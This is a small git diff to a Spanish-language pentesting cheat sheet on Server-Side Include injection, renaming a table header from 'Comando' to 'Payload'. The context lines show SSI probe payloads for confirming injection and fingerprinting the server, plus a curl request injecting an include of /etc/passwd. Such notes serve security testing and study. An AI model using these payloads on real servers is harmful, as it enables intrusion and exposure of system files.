@@ -37,7 +37,7 @@ linked:
 
 ## Probes Iniciales
 
-| **Comando** | **Qué confirma** | **Indicador** |
+| **Payload** | **Qué confirma** | **Indicador** |
 |---|---|---|
 | `<!--#echo var="DATE_LOCAL" -->` | SSI activo | Renderiza la fecha |
 | `<!--#echo var="DOCUMENT_NAME" -->` | SSI activo | Muestra el filename |
@@ -78,7 +78,7 @@ curl -s "$TARGET?q=<!--%23include+file=%22/etc/passwd%22+-->"
 
 ## Fingerprint del Server (Recon Profundo)
 
-| **Comando** | **Info** | **Uso** |
+| **Payload** | **Info** | **Uso** |
 |---|---|---|
 | `<!--#echo var="SERVER_SOFTWARE" -->` | Versión completa del server | Lookup de CVEs |
 | `<!--#echo var="SERVER_NAME" -->` | Hostname | Recon de red |
